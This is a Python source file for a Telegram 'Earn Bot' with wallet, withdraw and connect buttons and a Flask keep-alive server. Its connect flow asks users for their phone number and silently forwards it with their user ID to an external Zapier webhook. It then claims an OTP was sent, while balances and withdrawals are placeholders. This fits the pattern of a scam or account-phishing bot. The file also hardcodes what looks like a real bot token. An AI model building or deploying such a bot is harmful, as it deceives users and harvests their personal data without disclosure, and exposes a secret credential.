import threading
import requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ================= CONFIG =================
TOKEN = "8692523280:AAHS7nx1ZRrMafTkV5PWOkpysHliEsz-q4E"
ADMIN_ID = 5471364167
ZAPIER_WEBHOOK = "https://hooks.zapier.com/hooks/catch/XXXX"

# ================= FLASK =================
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot Running Successfully ✅"

# ================= DATABASE =================
users = {}

# ================= MENU =================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start", callback_data="start")],
        [InlineKeyboardButton("💰 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("📤 Send", callback_data="send")],
        [InlineKeyboardButton("📱 Connect", callback_data="connect")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("🌐 Language", callback_data="lang")],
        [InlineKeyboardButton("📢 Channel", callback_data="channel")]
    ])

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    users.setdefault(uid, {"balance": 0})

    await update.message.reply_text(
        "🚀 Welcome to Earn Bot System\nChoose option below 👇",
        reply_markup=main_menu()
    )

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    uid = query.from_user.id
    users.setdefault(uid, {"balance": 0})

    data = query.data

    if data == "start":
        await query.edit_message_text("🚀 Bot Started Successfully!", reply_markup=main_menu())

    elif data == "wallet":
        bal = users[uid]["balance"]
        await query.edit_message_text(f"💰 Your Balance: {bal} USD", reply_markup=main_menu())

    elif data == "send":
        await query.edit_message_text("📤 Send feature coming soon...", reply_markup=main_menu())

    elif data == "connect":
        await query.edit_message_text("📱 Send your phone number in chat now")
        context.user_data["phone"] = True

    elif data == "withdraw":
        await query.edit_message_text("💸 Withdraw request received (demo mode)", reply_markup=main_menu())

    elif data == "lang":
        await query.edit_message_text("🌐 Language set to English", reply_markup=main_menu())

    elif data == "channel":
        await query.edit_message_text(
            "📢 Join Channel: https://t.me/yourchannel",
            reply_markup=main_menu()
        )

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if context.user_data.get("phone"):
        users[uid]["phone"] = text

        # send to Zapier
        if ZAPIER_WEBHOOK:
            try:
                requests.post(ZAPIER_WEBHOOK, json={
                    "user": uid,
                    "phone": text
                })
            except:
                pass

        await update.message.reply_text("🔐 OTP Sent (demo mode)")
        context.user_data["phone"] = False

# ================= BOT RUN =================
def run_bot():
    app_bot = ApplicationBuilder().token(TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CallbackQueryHandler(button_handler))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    app_bot.run_polling()

# ================= RUN BOTH =================
if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=10000)
